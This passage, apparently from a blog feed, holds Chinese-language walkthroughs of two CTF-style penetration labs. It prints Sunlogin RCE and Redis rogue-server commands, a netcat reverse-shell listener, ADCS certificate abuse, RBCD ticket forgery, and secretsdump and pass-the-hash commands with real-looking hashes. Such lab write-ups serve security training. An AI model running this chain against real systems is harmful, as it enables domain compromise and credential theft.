&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">(&lt;/span>icmp&lt;span class="o">)&lt;/span> Target 172.22.12.25 is alive
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">(&lt;/span>icmp&lt;span class="o">)&lt;/span> Target 172.22.12.31 is alive
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Icmp alive hosts len is: &lt;span class="m">4&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">172.22.12.6:88 open
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">172.22.12.25:6379 open
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">172.22.12.31:445 open
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">172.22.12.25:445 open
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">172.22.12.12:445 open
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">172.22.12.6:445 open
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">172.22.12.31:139 open
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">172.22.12.25:139 open
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">172.22.12.12:139 open
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">172.22.12.6:139 open
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">172.22.12.31:135 open
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">172.22.12.6:135 open
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">172.22.12.12:135 open
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">172.22.12.25:135 open
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">172.22.12.31:80 open
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">172.22.12.12:80 open
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">172.22.12.31:21 open
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> alive ports len is: &lt;span class="m">17&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">start vulscan
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> NetInfo
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span>172.22.12.25
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">[&lt;/span>-&amp;gt;&lt;span class="o">]&lt;/span>WIN-YUYAOX9Q
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">[&lt;/span>-&amp;gt;&lt;span class="o">]&lt;/span>172.22.12.25
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> NetInfo
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span>172.22.12.12
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">[&lt;/span>-&amp;gt;&lt;span class="o">]&lt;/span>WIN-AUTHORITY
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">[&lt;/span>-&amp;gt;&lt;span class="o">]&lt;/span>172.22.12.12
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> NetInfo
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span>172.22.12.6
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">[&lt;/span>-&amp;gt;&lt;span class="o">]&lt;/span>WIN-SERVER
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">[&lt;/span>-&amp;gt;&lt;span class="o">]&lt;/span>172.22.12.6
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> NetInfo
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span>172.22.12.31
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">[&lt;/span>-&amp;gt;&lt;span class="o">]&lt;/span>WIN-IISQE3PC
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">[&lt;/span>-&amp;gt;&lt;span class="o">]&lt;/span>172.22.12.31
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> OsInfo 172.22.12.6 &lt;span class="o">(&lt;/span>Windows Server &lt;span class="m">2016&lt;/span> Standard 14393&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> NetBios 172.22.12.31 WORKGROUP&lt;span class="se">\W&lt;/span>IN-IISQE3PC
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> NetBios 172.22.12.12 WIN-AUTHORITY.xiaorang.lab Windows Server &lt;span class="m">2016&lt;/span> Datacenter &lt;span class="m">14393&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> NetBios 172.22.12.6 &lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> DC:WIN-SERVER.xiaorang.lab Windows Server &lt;span class="m">2016&lt;/span> Standard &lt;span class="m">14393&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> ftp 172.22.12.31:21:anonymous
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">[&lt;/span>-&amp;gt;&lt;span class="o">]&lt;/span>SunloginClient_11.0.0.33826_x64.exe
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> WebTitle http://172.22.12.12 code:200 len:703 title:IIS Windows Server
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> WebTitle http://172.22.12.31 code:200 len:703 title:IIS Windows Server
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> PocScan http://172.22.12.12 poc-yaml-active-directory-certsrv-detect
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> Redis 172.22.12.25:6379 unauthorized file:C:&lt;span class="se">\P&lt;/span>rogram Files&lt;span class="se">\R&lt;/span>edis/dump.rdb
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">已完成 17/17
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> 扫描结束,耗时: 14.7827441s
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;ul>
&lt;li>172.22.12.12 WIN-AUTHORITY.xiaorang.lab poc-yaml-active-directory-certsrv-detect&lt;/li>
&lt;li>172.22.12.6 DC:WIN-SERVER.xiaorang.lab(Windows Server 2016 Standard 14393)&lt;/li>
&lt;li>172.22.12.31:21 ftp :anonymous SunloginClient_11.0.0.33826_x64.exe&lt;/li>
&lt;li>172.22.12.25 已经被控&lt;/li>
&lt;/ul>
&lt;p>先打向日葵 &lt;a class="link" href="https://github.com/Mr-xn/sunlogin_rce" target="_blank" rel="noopener"
>https://github.com/Mr-xn/sunlogin_rce&lt;/a>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">.&lt;span class="se">\x&lt;/span>rkRce.exe -h 172.22.12.31 -t scan
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://baozongwi.xyz/p/springautumn-cloudmirror-magicrelay/9.png"
width="900"
height="360"
srcset="https://baozongwi.xyz/p/springautumn-cloudmirror-magicrelay/9_hu_77ff6c27c2f3e751.png 480w, https://baozongwi.xyz/p/springautumn-cloudmirror-magicrelay/9_hu_cf359c5c560f2b4e.png 1024w"
loading="lazy"
alt="1"
class="gallery-image"
data-flex-grow="250"
data-flex-basis="600px"
>&lt;/p>
&lt;p>权限足够，直接添加用户上去&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">.&lt;span class="se">\x&lt;/span>rkRce.exe -h 172.22.12.31 -t rce -p &lt;span class="m">49687&lt;/span> -c &lt;span class="s2">&amp;#34;whoami&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">.&lt;span class="se">\x&lt;/span>rkRce.exe -h 172.22.12.31 -t rce -p &lt;span class="m">49687&lt;/span> -c &lt;span class="s2">&amp;#34;net user test1 baozongwi123! /add&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">.&lt;span class="se">\x&lt;/span>rkRce.exe -h 172.22.12.31 -t rce -p &lt;span class="m">49687&lt;/span> -c &lt;span class="s2">&amp;#34;net localgroup administrators test1 /add&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>拿到第二个flag，&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">wmic computersystem get domain
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">net config workstation
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>发现并不在域里面这台机器，而是工作组&lt;/p>
&lt;h2 id="flag4">flag4
&lt;/h2>&lt;p>CS执行&lt;code>logonpasswords&lt;/code>，得到机器用户hash，来查询证书&lt;/p>
&lt;p>&lt;img src="https://baozongwi.xyz/p/springautumn-cloudmirror-magicrelay/10.png"
width="864"
height="578"
srcset="https://baozongwi.xyz/p/springautumn-cloudmirror-magicrelay/10_hu_89fcdf6def72375b.png 480w, https://baozongwi.xyz/p/springautumn-cloudmirror-magicrelay/10_hu_27e5b5b910e047d.png 1024w"
loading="lazy"
alt="1"
class="gallery-image"
data-flex-grow="149"
data-flex-basis="358px"
>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">proxychains4 certipy-ad find -u &lt;span class="s1">&amp;#39;WIN-YUYAOX9Q$&amp;#39;&lt;/span> -hashes &lt;span class="s1">&amp;#39;e611213c6a712f9b18a8d056005a4f0f&amp;#39;&lt;/span> -dc-ip 172.22.12.6
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>确实可以用&lt;strong>Machine&lt;/strong>模版，创建用户、申请证书、申请票据&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">sudo vim /etc/hosts
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">172.22.12.6 xiaorang.lab
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">172.22.12.12 WIN-AUTHORITY.xiaorang.lab
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">172.22.12.6 WIN-SERVER.xiaorang.lab
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">proxychains4 certipy-ad account create -user &lt;span class="s1">&amp;#39;TEST4$&amp;#39;&lt;/span> -pass &lt;span class="s1">&amp;#39;P@ssw0rd&amp;#39;&lt;/span> -dns WIN-SERVER.xiaorang.lab -dc-ip 172.22.12.6 -u &lt;span class="s1">&amp;#39;WIN-YUYAOX9Q$&amp;#39;&lt;/span> -hashes &lt;span class="s1">&amp;#39;e611213c6a712f9b18a8d056005a4f0f&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">proxychains4 certipy-ad req -u &lt;span class="s1">&amp;#39;TEST4$@xiaorang.lab&amp;#39;&lt;/span> -p &lt;span class="s1">&amp;#39;P@ssw0rd&amp;#39;&lt;/span> -ca &lt;span class="s1">&amp;#39;xiaorang-WIN-AUTHORITY-CA&amp;#39;&lt;/span> -dc-ip 172.22.12.6 -template &lt;span class="s1">&amp;#39;Machine&amp;#39;&lt;/span> -target 172.22.12.12
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">proxychains4 -q certipy-ad auth -pfx win-server.pfx -dc-ip 172.22.12.6
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://baozongwi.xyz/p/springautumn-cloudmirror-magicrelay/11.png"
width="1140"
height="221"
srcset="https://baozongwi.xyz/p/springautumn-cloudmirror-magicrelay/11_hu_740be8537a71c3c3.png 480w, https://baozongwi.xyz/p/springautumn-cloudmirror-magicrelay/11_hu_63507d722c816129.png 1024w"
loading="lazy"
alt="1"
class="gallery-image"
data-flex-grow="515"
data-flex-basis="1238px"
>&lt;/p>
&lt;p>没成功，把 PFX 文件转成 &lt;code>crt&lt;/code> 和 &lt;code>key&lt;/code>，利用&lt;strong>Pass-The-Cert&lt;/strong>来配置RBCD，伪造管理员申请票据&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">openssl pkcs12 -in win-server.pfx -nodes -out test.pem
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">openssl rsa -in test.pem -out test.key
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">openssl x509 -in test.pem -out test.crt
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">proxychains4 python3 passthecert.py -action whoami -crt test.crt -key test.key -domain xiaorang.lab -dc-ip 172.22.12.6
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">proxychains4 python3 passthecert.py -action write_rbcd -crt test.crt -key test.key -domain xiaorang.lab -dc-ip 172.22.12.6 -delegate-to &lt;span class="s1">&amp;#39;WIN-SERVER$&amp;#39;&lt;/span> -delegate-from &lt;span class="s1">&amp;#39;TEST2$&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">proxychains4 impacket-getST xiaorang.lab/&lt;span class="s1">&amp;#39;TEST2$&amp;#39;&lt;/span>:&lt;span class="s1">&amp;#39;P@ssw0rd&amp;#39;&lt;/span> -spn cifs/win-server.xiaorang.lab -impersonate Administrator -dc-ip 172.22.12.6
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">export&lt;/span> &lt;span class="nv">KRB5CCNAME&lt;/span>&lt;span class="o">=&lt;/span>Administrator@cifs_win-server.xiaorang.lab@XIAORANG.LAB.ccache
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">proxychains4 impacket-psexec Administrator@WIN-SERVER.xiaorang.lab -k -no-pass -dc-ip 172.22.12.6
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="flag3">flag3
&lt;/h2>&lt;p>导出&lt;code>NTHash&lt;/code>直接横向&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">proxychains4 impacket-secretsdump -k -no-pass xiaorang.lab/administrator@WIN-SERVER.xiaorang.lab
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">proxychains4 impacket-secretsdump -k -no-pass xiaorang.lab/administrator@WIN-SERVER.xiaorang.lab -just-dc-user administrator
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://baozongwi.xyz/p/springautumn-cloudmirror-magicrelay/12.png"
width="1054"
height="787"
srcset="https://baozongwi.xyz/p/springautumn-cloudmirror-magicrelay/12_hu_d52692a1c3dcbf73.png 480w, https://baozongwi.xyz/p/springautumn-cloudmirror-magicrelay/12_hu_710a3769f100f89e.png 1024w"
loading="lazy"
alt="1"
class="gallery-image"
data-flex-grow="133"
data-flex-basis="321px"
>&lt;/p>
&lt;p>有两个，都试一下&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">aad3b435b51404eeaad3b435b51404ee:d418e6aaeff1177bee5f84cf0466802c
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">aad3b435b51404eeaad3b435b51404ee:aa95e708a5182931157a526acf769b13
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">proxychains4 impacket-wmiexec xiaorang.lab/administrator@172.22.12.12 -hashes aad3b435b51404eeaad3b435b51404ee:aa95e708a5182931157a526acf769b13 -codec gbk
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div></description></item><item><title>春秋云镜Brute4Road</title><link>https://baozongwi.xyz/p/springautumn-cloudmirror-brute4road/</link><pubDate>Wed, 20 Aug 2025 13:30:44 +0800</pubDate><guid>https://baozongwi.xyz/p/springautumn-cloudmirror-brute4road/</guid><description>&lt;h2 id="flag1">flag1
&lt;/h2>&lt;p>fscan扫描一下靶机&lt;code>./fscan -h 39.98.116.123 -p 1-65535&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">39.98.116.123:22 open
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">39.98.116.123:21 open
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">39.98.116.123:80 open
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">39.98.116.123:6379 open
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> alive ports len is: &lt;span class="m">4&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">start vulscan
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> WebTitle http://39.98.116.123 code:200 len:4833 title:Welcome to CentOS
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> ftp 39.98.116.123:21:anonymous
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">[&lt;/span>-&amp;gt;&lt;span class="o">]&lt;/span>pub
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> Redis 39.98.116.123:6379 unauthorized file:/usr/local/redis/db/dump.rdb
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>有ftp和redis的未授权，链接一下&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">lftp -u anonymous, 39.98.116.123
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">set&lt;/span> ftp:charset GBK
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">redis-cli -h 39.98.116.123
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>ftp里面没东西，Redis得知版本为5.0.12。可以打主从复制RCE &lt;a class="link" href="https://github.com/n0b0dyCN/redis-rogue-server" target="_blank" rel="noopener"
>https://github.com/n0b0dyCN/redis-rogue-server&lt;/a> 但是特别容易打崩，记得把服务器的21000端口打开&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">python3 redis-rogue-server.py --rhost 39.98.116.123 --lhost 160.30.231.213
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">r
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">160.30.231.213
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="m">9999&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">nc -lvnp &lt;span class="m">9999&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>得到反弹shell之后接着交互一下，suid提权&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">script /dev/null
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">find / -perm -u&lt;span class="o">=&lt;/span>s -type f 2&amp;gt;/dev/null
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>看到有base64可以suid提权 &lt;a class="link" href="https://gtfobins.github.io/gtfobins/base64/" target="_blank" rel="noopener"
>https://gtfobins.github.io/gtfobins/base64/&lt;/a> 不过只能查看文件，后面发现并不在root目录，而且读取文件还不能使用通配符，&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">find / -name &lt;span class="s2">&amp;#34;flag&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
